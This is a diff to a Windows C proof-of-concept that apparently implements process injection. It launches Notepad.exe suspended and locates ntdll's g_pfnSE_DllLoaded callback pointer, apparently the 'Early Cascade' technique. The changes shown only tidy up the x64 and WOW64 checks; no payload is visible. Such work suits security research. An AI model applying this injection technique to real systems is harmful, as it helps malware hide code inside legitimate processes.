@@ -8,6 +8,10 @@
 #include <Windows.h>
 #include <stdio.h>
 
+#if !defined(_WIN64)
+#error This PoC must be compiled in x64 mode
+#endif
+
 #define TARGET_PROCESS "Notepad.exe"
 #define MAX_PATTERN_SIZE 0x20
 #define CHECK_IN_RANGE(dwBasePtr, dwPtr, dwSecPtr) \
@@ -266,9 +270,7 @@ int main(int argc, char **argv) {
     LPVOID pPtr;
     int nSuccess = EXIT_FAILURE;
     BOOL bEnable = TRUE;
-#if defined(_WIN32) && !defined(_WIN64)
     BOOL bIsWow64 = FALSE;
-#endif
 
     puts(
 
@@ -298,7 +300,7 @@ int main(int argc, char **argv) {
         FALSE, 
         CREATE_SUSPENDED, 
         NULL, 
-        (LPCSTR) "C:\\Windows\\System32\\", 
+        NULL, 
         &si, 
         &pi
     ) )
@@ -313,17 +315,12 @@ int main(int argc, char **argv) {
 
     do {
 
-#if defined(_WIN32) && !defined(_WIN64)
-        if ( IsWow64Process(pi.hProcess, &bIsWow64) && bIsWow64 )
-            goto CASCADE;    
-#endif
+        /* Check if the target process is not 64bit (May someone sets TARGET_PROCESS to a wow64 process) */
+        if ( IsWow64Process(pi.hProcess, &bIsWow64) && bIsWow64 ) {
+            puts( "[-] This PoC targets x64 processes only" );
+            break;
+        }
 
-#if !defined(_WIN64)
-        puts( "[-] This PoC targets x64 processes only" );
-        break;
-#endif
-
-CASCADE:
         puts( "[*] Dynamically Search for the Callback Pointer Address ( g_pfnSE_DllLoaded )");
         if ( !(pSE_DllLoadedAddress = find_SE_DllLoadedAddress(hNtDLL, &pPtr)) )
             break;
